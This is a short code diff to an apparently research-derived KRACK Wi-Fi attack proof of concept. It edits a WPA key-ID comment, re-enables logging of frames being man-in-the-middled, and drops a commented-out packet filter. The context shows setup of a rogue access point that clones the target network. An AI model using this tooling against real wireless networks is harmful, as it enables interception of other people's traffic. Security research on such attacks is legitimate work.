@@ -147,7 +147,7 @@ def dot11_get_iv(p):
 	if wep.keyid & 32:
 		return ord(chr(wep.iv[0])) + (ord(chr(wep.iv[1])) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
 	else:
-		# 解析 WPA KEY ID (b'\x00\x00\x00\x00')
+		# 解析 WPA KEY ID (b'\x00\x00\x00')
 		return (wep.iv[0]) + ((wep.iv[1])<< 8) + ((wep.iv[2]) << 16)
 
 def dot11_get_tid(p):
@@ -667,15 +667,15 @@ class KRAckAttack():
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
-			# # Pay special attention to Deauth and Disassoc frames
-			# if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# # If targeting a specific client, display all frames it sends
-			# elif self.clientmac is not None and self.clientmac == p.addr1:
-			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# # For other clients, just display what might be forwarded
-			# elif might_forward:
-			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+			# Pay special attention to Deauth and Disassoc frames
+			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+			# If targeting a specific client, display all frames it sends
+			elif self.clientmac is not None and self.clientmac == p.addr1:
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+			# For other clients, just display what might be forwarded
+			elif might_forward:
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
@@ -847,15 +847,6 @@ class KRAckAttack():
 		if self.nic_real_clientack: 
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
-
-
-		# # FIXME: Set BFP filters to increase performance, can't set suceessful.
-		# bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
-		# if self.clientmac:
-		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
-		# bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
-		# self.sock_real.attach_filter(bpf)
-		# self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
